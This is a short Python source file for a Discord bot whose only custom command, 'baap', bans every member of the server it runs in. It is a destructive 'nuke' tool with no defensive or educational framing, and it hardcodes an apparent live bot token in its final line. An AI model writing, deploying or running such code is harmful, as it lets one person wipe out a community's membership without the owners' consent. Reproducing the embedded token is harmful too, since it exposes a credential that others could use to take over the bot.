import discord
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
from aiohttp import ClientSession
import aiohttp
import jishaku


intents = discord.Intents.all()
bot = commands.Bot(command_prefix = 'PREFIX HERE', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}({bot.user.id})')

@bot.command(aliases=['king,baap'])

async def baap(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue

bot.load_extension('jishaku')

bot.run('ODQwMTkyMzM2NjI1MTM5NzQz.YJUoFw.W6t79Ws-IrCDdm6_oGvq6j-MRQk')
